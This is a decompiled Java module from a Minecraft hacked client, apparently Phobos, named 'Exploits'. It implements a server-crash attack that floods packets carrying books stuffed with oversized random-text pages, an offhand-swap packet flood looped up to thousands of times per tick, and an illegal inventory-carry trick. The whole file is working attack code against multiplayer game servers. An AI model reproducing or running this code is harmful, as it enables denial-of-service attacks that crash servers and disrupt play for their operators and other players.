// 
// Decompiled by Procyon v0.5.36
// 

package me.earth.phobos.features.modules.misc;

import net.minecraftforge.fml.common.eventhandler.EventPriority;
import net.minecraft.inventory.Slot;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.client.gui.inventory.GuiContainer;
import org.lwjgl.input.Keyboard;
import net.minecraftforge.fml.common.gameevent.InputEvent;
import java.util.Random;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.inventory.ClickType;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraft.init.SoundEvents;
import net.minecraft.network.play.server.SPacketSoundEffect;
import me.earth.phobos.event.events.PacketEvent;
import net.minecraft.client.gui.GuiMultiplayer;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.client.gui.GuiDownloadTerrain;
import net.minecraft.client.gui.GuiDisconnected;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.util.EnumFacing;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.util.math.BlockPos;
import net.minecraft.network.Packet;
import me.earth.phobos.features.setting.Bind;
import me.earth.phobos.features.setting.Setting;
import me.earth.phobos.features.modules.Module;

public class Exploits extends Module
{
    public Setting<Boolean> illegalCarry;
    public Setting<Bind> toXCarry;
    public Setting<Bind> fromXCarry;
    public Setting<Boolean> bookCrash;
    public Setting<Mode> mode;
    public Setting<Integer> delay;
    public Setting<Integer> strLength;
    public Setting<Boolean> offhandCrash;
    private final Setting<Boolean> antilag;
    private final Setting<Boolean> docrash;
    private final Setting<Integer> loopzz;
    private Packet packet;
    private String pages;
    private boolean flag;
    
    public Exploits() {
        super("Exploits", "Some expploits", Category.MISC, true, false, false);
        this.illegalCarry = (Setting<Boolean>)this.register(new Setting("IllegalCarry", (T)false));
        this.toXCarry = (Setting<Bind>)this.register(new Setting("ToXCarry", (T)new Bind(-1), v -> this.illegalCarry.getValue()));
        this.fromXCarry = (Setting<Bind>)this.register(new Setting("FromXCarry", (T)new Bind(-1), v -> this.illegalCarry.getValue()));
        this.bookCrash = (Setting<Boolean>)this.register(new Setting("BookCrash", (T)false));
        this.mode = (Setting<Mode>)this.register(new Setting("Mode", (T)Mode.WindowClick, v -> this.bookCrash.getValue()));
        this.delay = (Setting<Integer>)this.register(new Setting("Delay", (T)5, (T)1, (T)500, v -> this.bookCrash.getValue()));
        this.strLength = (Setting<Integer>)this.register(new Setting("Length", (T)600, (T)100, (T)655, v -> this.bookCrash.getValue()));
        this.offhandCrash = (Setting<Boolean>)this.register(new Setting("OffhandCrash", (T)false));
        this.antilag = (Setting<Boolean>)this.register(new Setting("AntiOffhandCrash", (T)true, v -> this.offhandCrash.getValue()));
        this.docrash = (Setting<Boolean>)this.register(new Setting("Use Offhand Crash", (T)true, v -> this.offhandCrash.getValue()));
        this.loopzz = (Setting<Integer>)this.register(new Setting("Times to loop", (T)500, (T)100, (T)5000, v -> this.offhandCrash.getValue()));
        this.pages = "";
        this.flag = true;
    }
    
    @Override
    public void onEnable() {
        if (this.bookCrash.getValue()) {
            this.pages = this.genRandomString(this.strLength.getValue());
            this.runThread();
            this.flag = true;
        }
    }
    
    @Override
    public void onDisable() {
        if (this.bookCrash.getValue()) {
            this.pages = "";
            this.flag = false;
        }
    }
    
    @Override
    public void onUpdate() {
        if (this.offhandCrash.getValue()) {
            if (this.docrash.getValue()) {
                for (int i = 0; i < this.loopzz.getValue(); ++i) {
                    final BlockPos playerBlock = new BlockPos(Exploits.mc.player.posX, Exploits.mc.player.posY - 1.0, Exploits.mc.player.posZ);
                    Exploits.mc.player.connection.sendPacket((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, playerBlock, EnumFacing.UP));
                }
            }
            if ((Exploits.mc.currentScreen instanceof GuiMainMenu || Exploits.mc.currentScreen instanceof GuiDisconnected || Exploits.mc.currentScreen instanceof GuiDownloadTerrain || Exploits.mc.currentScreen instanceof GuiConnecting || Exploits.mc.currentScreen instanceof GuiMultiplayer) && this.isEnabled()) {
                this.toggle();
            }
        }
    }
    
    @SubscribeEvent
    public void onPacketSend(final PacketEvent.Send event) {
        if (this.offhandCrash.getValue() && this.antilag.getValue() && event.getPacket() instanceof SPacketSoundEffect) {
            final SPacketSoundEffect packet = event.getPacket();
            if (packet.getSound() == SoundEvents.ITEM_ARMOR_EQUIP_GENERIC) {
                event.setCanceled(true);
            }
        }
    }
    
    @Override
    public void onLogout() {
        this.disable();
    }
    
    @Override
    public void onUnload() {
        this.disable();
    }
    
    private void runThread() {
        ItemStack bookObj;
        NBTTagList list;
        NBTTagCompound tag;
        String author;
        int i;
        NBTTagString tString;
        new Thread(() -> {
            try {
                bookObj = new ItemStack(Items.WRITABLE_BOOK);
                list = new NBTTagList();
                tag = new NBTTagCompound();
                author = Exploits.mc.getSession().getUsername();
                for (i = 0; i < 50; ++i) {
                    tString = new NBTTagString(this.pages);
                    list.appendTag((NBTBase)tString);
                }
                tag.setString("author", author);
                tag.setString("title", "\n ZimCRASH \n");
                tag.setTag("pages", (NBTBase)list);
                bookObj.setTagInfo("pages", (NBTBase)list);
                bookObj.setTagCompound(tag);
                if (this.mode.getValue() == Mode.ConsoleSpammer) {
                    this.pages = this.genRandomString(8192);
                    this.strLength.setValue(8192);
                    this.delay.setValue(225);
                }
                while (this.flag) {
                    switch (this.mode.getValue()) {
                        case CreativeInventory: {
                            this.packet = (Packet)new CPacketCreativeInventoryAction(0, bookObj);
                        }
                        case WindowClick: {
                            this.packet = (Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0);
                        }
                        case ConsoleSpammer: {
                            this.packet = (Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0);
                            break;
                        }
                    }
                    Exploits.mc.player.connection.sendPacket(this.packet);
                    try {
                        Thread.sleep(this.delay.getValue());
                    }
                    catch (Exception e2) {
                        Thread.interrupted();
                    }
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    private String genRandomString(final Integer Length) {
        final String SALTCHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        final StringBuilder salt = new StringBuilder();
        final Random rnd = new Random();
        while (salt.length() < Length) {
            final int index = (int)(rnd.nextFloat() * SALTCHARS.length());
            salt.append(SALTCHARS.charAt(index));
        }
        final String saltStr = salt.toString();
        return saltStr;
    }
    
    @SubscribeEvent(priority = EventPriority.NORMAL, receiveCanceled = true)
    public void onKeyInput(final InputEvent.KeyInputEvent event) {
        if (this.illegalCarry.getValue() && Keyboard.getEventKeyState() && Exploits.mc.currentScreen instanceof GuiContainer) {
            if (this.toXCarry.getValue().getKey() == Keyboard.getEventKey()) {
                final GuiContainer container = (GuiContainer)Exploits.mc.currentScreen;
                final Slot slot = container.getSlotUnderMouse();
                if (slot != null) {
                    Exploits.mc.playerController.windowClick(container.inventorySlots.windowId, slot.getSlotIndex(), 0, ClickType.PICKUP, (EntityPlayer)Exploits.mc.player);
                    Exploits.mc.playerController.windowClick(container.inventorySlots.windowId, -999, 0, ClickType.QUICK_CRAFT, (EntityPlayer)Exploits.mc.player);
                    Exploits.mc.playerController.windowClick(0, 1, 1, ClickType.QUICK_CRAFT, (EntityPlayer)Exploits.mc.player);
                    Exploits.mc.playerController.windowClick(container.inventorySlots.windowId, -999, 2, ClickType.QUICK_CRAFT, (EntityPlayer)Exploits.mc.player);
                }
            }
            else if (this.fromXCarry.getValue().getKey() == Keyboard.getEventKey()) {
                final GuiContainer container = (GuiContainer)Exploits.mc.currentScreen;
                final Slot slot = container.getSlotUnderMouse();
                if (slot != null) {
                    Exploits.mc.playerController.windowClick(0, 1, 0, ClickType.PICKUP, (EntityPlayer)Exploits.mc.player);
                    Exploits.mc.playerController.windowClick(0, -999, 0, ClickType.QUICK_CRAFT, (EntityPlayer)Exploits.mc.player);
                    Exploits.mc.playerController.windowClick(container.inventorySlots.windowId, slot.getSlotIndex(), 1, ClickType.QUICK_CRAFT, (EntityPlayer)Exploits.mc.player);
                    Exploits.mc.playerController.windowClick(0, -999, 2, ClickType.QUICK_CRAFT, (EntityPlayer)Exploits.mc.player);
                }
            }
        }
    }
    
    private enum Mode
    {
        CreativeInventory, 
        WindowClick, 
        ConsoleSpammer;
    }
}
